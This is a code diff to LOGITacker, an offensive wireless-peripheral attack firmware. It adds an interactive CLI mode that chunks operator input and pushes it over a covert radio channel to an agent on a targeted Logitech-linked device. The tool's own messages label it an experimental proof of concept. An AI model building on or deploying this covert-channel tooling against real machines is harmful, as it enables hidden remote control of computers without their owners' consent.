@@ -18,6 +18,7 @@
 #include "logitacker_flash.h"
 #include "logitacker_processor_inject.h"
 #include "logitacker_script_engine.h"
+#include "logitacker_processor_covert_channel.h"
 
 #define CLI_TEST_COMMANDS
 
@@ -114,7 +115,7 @@ static void dynamic_script_name(size_t idx, nrf_cli_static_entry_t *p_static)
 
     if (idx == 0) stored_script_names_str_list_update();
 
-    NRF_LOG_INFO("script list len %d", m_stored_script_names_str_list_len);
+    //NRF_LOG_INFO("script list len %d", m_stored_script_names_str_list_len);
 
     if (idx >= m_stored_script_names_str_list_len) {
         p_static->p_syntax = NULL;
@@ -1261,6 +1262,57 @@ static void cmd_enum_active(nrf_cli_t const * p_cli, size_t argc, char **argv) {
 }
 
 #ifdef CLI_TEST_COMMANDS
+bool pre_cmd_callback_covert_channel(nrf_cli_t const * p_cli, char const * const p_cmd_buf) {
+    if (strcmp(p_cmd_buf, "!exit") == 0) {
+        nrf_cli_register_pre_cmd_callback(p_cli, NULL);
+        logitacker_enter_mode_discovery();
+        return true;
+    }
+
+    covert_channel_payload_data_t tmp_tx_data = {0};
+
+    //push chunks of cmd_buff
+
+    // ToDo: fix client
+    //payload size reduzed to 15, because client agent doesn't ack full size payloads
+#define MAX_CC_PAY_SIZE 15
+
+    int pos = 0;
+    while (strlen(&p_cmd_buf[pos]) >= MAX_CC_PAY_SIZE) {
+        memcpy(tmp_tx_data.data, &p_cmd_buf[pos], MAX_CC_PAY_SIZE);
+        tmp_tx_data.len = MAX_CC_PAY_SIZE;
+
+        NRF_LOG_HEXDUMP_DEBUG(tmp_tx_data.data, MAX_CC_PAY_SIZE);
+        uint32_t err = logitacker_covert_channel_push_data(&tmp_tx_data);
+        if (err != NRF_SUCCESS) {
+            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "error writing covert channel data 0x%08x\r\n", err);
+            return true;
+        }
+
+        pos += MAX_CC_PAY_SIZE;
+    }
+
+
+    size_t slen = strlen(&p_cmd_buf[pos]);
+
+    memset(tmp_tx_data.data, 0, 16);
+    memcpy(tmp_tx_data.data, &p_cmd_buf[pos], slen);
+    tmp_tx_data.len = slen + 1;
+
+    //append line break
+    tmp_tx_data.data[slen] = '\n';
+
+    NRF_LOG_HEXDUMP_DEBUG(tmp_tx_data.data,tmp_tx_data.len);
+
+    uint32_t err = logitacker_covert_channel_push_data(&tmp_tx_data);
+    if (err != NRF_SUCCESS) {
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "error writing covert channel data 0x%08x\r\n", err);
+    }
+
+    return true;
+}
+
+
 static void cmd_covert_channel(nrf_cli_t const * p_cli, size_t argc, char **argv) {
     if (argc > 1)
     {
@@ -1275,7 +1327,13 @@ static void cmd_covert_channel(nrf_cli_t const * p_cli, size_t argc, char **argv
         char tmp_addr_str[16];
         helper_addr_to_hex_str(tmp_addr_str, 5, addr);
         nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting covert channel for device %s\r\n", tmp_addr_str);
-        logitacker_enter_mode_covert_channel(addr);
+        logitacker_enter_mode_covert_channel(addr, p_cli);
+
+        nrf_cli_register_pre_cmd_callback(p_cli, &pre_cmd_callback_covert_channel);
+        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "enter '!exit' to return to normal CLI mode\r\n\r\n");
+        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "This feature is a PoC in experimental state\r\n");
+        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "I don't accept issues or requests on it, unless they fly in \r\nas working PR for LOGITacker\r\n");
+
         return;
     } else {
         nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
